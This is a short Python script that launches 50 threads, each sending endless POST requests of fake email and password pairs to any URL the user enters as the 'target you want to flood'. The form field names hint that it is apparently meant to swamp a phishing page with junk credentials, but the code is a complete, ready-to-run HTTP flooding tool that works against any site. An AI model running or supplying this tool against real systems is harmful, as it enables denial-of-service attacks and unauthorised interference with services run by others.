import threading
import requests
import random
import string
from faker import Faker

fake = Faker()

def generate_random_email():
    return fake.email()

def generate_random_password():
    # Generate a random password of length 8
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(8))

def send_posts(url):
    while True:
        email = generate_random_email()
        password = generate_random_password()
        data = {
            "a": email,
            "az": password
        }
        response = requests.post(url, data=data)
        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}")

def main():
    # Ask user for URL to flood
    url = input("Enter the URL of the target you want to flood: ")

    threads = []

    for i in range(50):
        t = threading.Thread(target=send_posts, args=(url,))
        t.daemon = True
        threads.append(t)

    for i in range(50):
        threads[i].start()

    for i in range(50):
        threads[i].join()

if __name__ == "__main__":
    main()
